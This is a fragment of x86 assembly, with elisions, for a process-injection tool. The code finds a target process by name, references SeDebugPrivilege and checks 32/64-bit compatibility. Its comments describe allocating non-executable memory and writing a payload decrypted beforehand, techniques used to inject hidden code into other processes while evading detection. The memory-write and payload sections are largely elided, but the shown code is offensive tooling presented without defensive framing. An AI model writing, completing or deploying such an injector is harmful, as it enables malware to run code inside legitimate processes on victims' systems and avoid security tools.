...
IsWow64Process       PROTO STDCALL :DWORD, :PTR DWORD
...
.data
    ...
    msgSearching   BYTE "[*] Searching for Process ID...",0Ah,0
    msgNotFound    BYTE "[-] Error: Process Name not found in system!",0Ah,0
    msgArchCheck   BYTE "[*] Checking Target Architecture...",0Ah,0
    msgBadArch     BYTE "[-] Error: Target is a 64-bit process!",0Ah,13,"    This tool is 32-bit and will crash it. Stopping...",0Ah,0
    
    seDebugName    BYTE "SeDebugPrivilege",0
    filePath       BYTE 260 DUP(0)
    targetName     BYTE 260 DUP(0)
    
    promptName     BYTE 0Ah,"[?] Enter Target Process Name (e.g., notepad.exe): ",0
    ...
    isWow64        DWORD 0 ; Buffer for Architecture check
...
; -------------------------------------------------------
GetProcessIDFromName PROC uses ebx esi edi, pName:PTR BYTE
    LOCAL snapshot:DWORD
    LOCAL processEntry:PROCESSENTRY32

    invoke CreateToolhelp32Snapshot, 00000002h, 0 ; TH32CS_SNAPPROCESS
    cmp eax, -1
    je G_Fail
    mov snapshot, eax
...
G_Loop:
    invoke lstrcmpiA, pName, ADDR processEntry.szExeFile
    test eax, eax
    jz G_Found
...
get_pid:
    ; 5. Find PID from Name
    mov edx, OFFSET promptName
    call WriteString
    mov edx, OFFSET targetName
    mov ecx, 259
    call ReadString
    
    mov edx, OFFSET msgSearching
    call WriteString
    invoke GetProcessIDFromName, ADDR targetName
    mov targetPID, eax
...
pid_found:
    ...
    ; --- ARCHITECTURE CHECK (32/64 bit safety) ---
    mov edx, OFFSET msgArchCheck
    call WriteString

    ; First, check if WE are running on a 64-bit OS
    invoke GetCurrentProcess
    invoke IsWow64Process, eax, ADDR isWow64
    cmp isWow64, 0
    je arch_safe ; If we aren't WOW64, then it's a 32-bit OS, everything is safe

    ; If we ARE on a 64-bit OS, check if the TARGET is 32-bit (WOW64)
    invoke IsWow64Process, hProc, ADDR isWow64
    cmp isWow64, 0
    jne arch_safe ; If target is WOW64, it's 32-bit, so it's safe

    ; Otherwise it's 64-bit, so we stop to prevent crash
    mov edx, OFFSET msgBadArch
    call WriteString
    invoke CloseHandle, hProc
    jmp fatal_error

arch_safe:
    ; 7. Alloc RW Memory (Not RWX)
    ...
    ; 8. Write Payload (It is now Clean code because we decrypted it above)
